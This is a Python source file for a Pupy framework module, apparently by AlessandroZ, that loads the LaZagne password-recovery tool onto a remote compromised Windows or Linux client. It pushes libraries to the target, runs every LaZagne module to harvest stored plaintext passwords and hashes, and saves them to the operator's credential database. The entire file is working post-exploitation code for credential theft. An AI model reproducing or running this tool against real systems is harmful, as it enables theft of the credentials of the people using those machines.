# -*- coding: UTF8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
import tempfile
import subprocess
import os.path
import sys
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="LaZagne"

@config(cat="creds")
class LaZagne(PupyModule):
    """ 
        execute LaZagne (Windows / Linux)
    """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="lazagne", description=self.__doc__)
        self.arg_parser.add_argument("-v", "--verbose", action='store_true')

    def run(self, args):
        ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",))
        platform = self.client.desc["platform"]

        if "Windows" in platform:
            if "64" in self.client.desc["proc_arch"]:
                arch = "amd64"
            else:
                arch = "x86"

            # load all dependencies
            self.client.load_dll(os.path.abspath(os.path.join(ROOT, "packages", "windows", arch, "sqlite3.dll")))
            py_to_load = ['sqlite3', '_sqlite3', 'xml', '_elementtree', 'pyexpat', 'win32crypt', 'win32api', 'win32con', 'win32cred', 'colorama', 'impacket', 'calendar', 'win32security', 'win32net']
            for py in py_to_load:
                self.client.load_package(py)
                # self.success('%s loaded' % py)

        elif "Linux" in platform:
            py_to_load = ['sqlite3', 'pupyimporter', 'dbus', 'xml', 'etree']
            for py in py_to_load:
                self.client.load_package(py)
                # self.success('%s loaded' % py)

            package_path = os.path.join(ROOT, "packages", "linux", 'all')
            lib_to_load = [
                {'fullname':'_sqlite3', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "_sqlite3.so")}, 
                {'fullname':'pyexpat', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "pyexpat.so")},
                {'fullname':'_elementtree', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "_elementtree.so")},
                {'fullname':'crypt', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "crypt.so")},
                {'fullname':'_dbus_bindings', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "_dbus_bindings.so")}
            ]
            for lib in lib_to_load:
                lib['content'] = open(lib['path'], 'rb').read()
                obj = self.client.conn.modules["pupyimporter"].PupyPackageLoader(fullname=lib['fullname'], contents=lib['content'], extension=lib['extension'], is_pkg=lib['is_pkg'], path=lib['path'])
                obj.load_module(lib['fullname'])
                # self.success('%s loaded' % lib['fullname'])
        else:
            self.error("Platform not supported")
            return

        # Run laZagne
        self.client.load_package("lazagne")

        # Launch all LaZagne modules
        db = Credentials()
        passwordsFound = False
        moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
        for module in moduleNames:
            if args.verbose:
                self.info("running module %s"%(str(module).split(' ',1)[0].strip('<')))
            passwords = module.run(module.options['dest'].capitalize())
            passwordsFound = True
            self.print_results(module.options['dest'].capitalize(), passwords, db)
        
        if not passwordsFound:
            self.warning("no passwords found !")

    def print_results(self, module, creds, db):
        if creds:
            print "\n############## %s passwords ##############\n" % module
            clean_creds = []
            for cred in creds:
                clean_cred = {}
                clean_cred['Category'] = '%s' % module
                clean_cred['uid']=self.client.short_name()
                for c in cred.keys():
                    clean_cred[c] = cred[c].encode('utf-8')
                    print "%s: %s" % (c, cred[c])
                    if c == "Password":
                        clean_cred['CredType'] = 'plaintext'
                    elif c == 'Hash':
                        clean_cred['CredType'] = 'hash'
                print
                # manage when no password found
                if 'CredType' not in clean_cred:
                    clean_cred['CredType'] = 'empty'
                clean_creds.append(clean_cred)

            try:
                db.add(clean_creds)
                self.success("Passwords stored on the database")
            except Exception, e:
                print e
